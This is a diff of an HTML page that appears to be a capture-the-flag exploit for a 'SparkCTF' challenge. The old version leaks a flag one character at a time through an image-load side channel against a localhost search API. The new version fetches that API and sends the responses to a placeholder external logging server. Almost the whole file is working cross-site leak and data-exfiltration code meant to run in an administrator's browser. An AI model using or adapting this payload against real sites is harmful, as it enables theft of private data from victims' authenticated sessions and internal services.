@@ -1,61 +1,42 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="utf-8">
-    <title>CTF XS-Leak Exploit</title>
-  </head>
-  <body>
+<head>
+    <title>Exploit</title>
+</head>
+<body>
     <script>
-      // Allowed characters in the flag format
-      const allowedChars = "abcdefghijklmnopqrstuvwxyz0123456789_";
-      // Start with the known prefix
-      let flag = "SparkCTF{";
+        function leakFlag() {
+            let payload = "SparkCTF{";
+            let externalServer = "https://your-external-server.com/log?data="; // Change this!
 
-      // Function to test if the current prefix is valid
-      async function testPrefix(prefix) {
-        // We use a side-channel technique such as loading an image
-        return new Promise(resolve => {
-          let img = new Image();
-          // If the response causes a particular behavior (e.g. a successful load),
-          // that indicates our prefix matched a note's content.
-          img.onload = function() {
-            resolve(true);
-          };
-          img.onerror = function() {
-            resolve(false);
-          };
-          // Point the image source to the internal API search endpoint
-          // (admin’s browser can access localhost)
-          img.src = "https://127.0.0.1:3000/api/search?input=" + encodeURIComponent(prefix);
-        });
-      }
-
-      // Function to iteratively leak the flag
-      async function leakFlag() {
-        // Continue until we suspect the flag is complete (ends with "}")
-        while (!flag.endsWith("}")) {
-          let found = false;
-          // Try each allowed character for the next position
-          for (let char of allowedChars) {
-            let candidate = flag + char;
-            let result = await testPrefix(candidate);
-            if (result) {
-              flag += char;
-              console.log("Found character: " + char + " -> " + flag);
-              found = true;
-              break;
+            // Function to send data to your external server
+            function exfiltrate(data) {
+                new Image().src = externalServer + encodeURIComponent(data);
             }
-          }
-          if (!found) {
-            console.log("No matching character found. Stopping leak.");
-            break;
-          }
-        }
-        console.log("Leaked flag: " + flag);
-        // Optionally: exfiltrate the flag (e.g., via your own server or display it)
-      }
 
-      leakFlag();
+            // Try both HTTP and HTTPS
+            let urls = [
+                "http://127.0.0.1:3000/api/search?input=" + payload,
+                "https://127.0.0.1:3000/api/search?input=" + payload
+            ];
+
+            urls.forEach(url => {
+                fetch(url)
+                    .then(response => response.text())
+                    .then(data => {
+                        console.log("Success:", data);
+                        exfiltrate(data); // Send the response out
+                    })
+                    .catch(err => console.error("Error:", err));
+            });
+
+            // Image-based request (bypasses some restrictions)
+            let img = new Image();
+            img.src = "http://127.0.0.1:3000/api/search?input=" + payload;
+            document.body.appendChild(img);
+        }
+
+        leakFlag();
     </script>
-  </body>
+</body>
 </html>
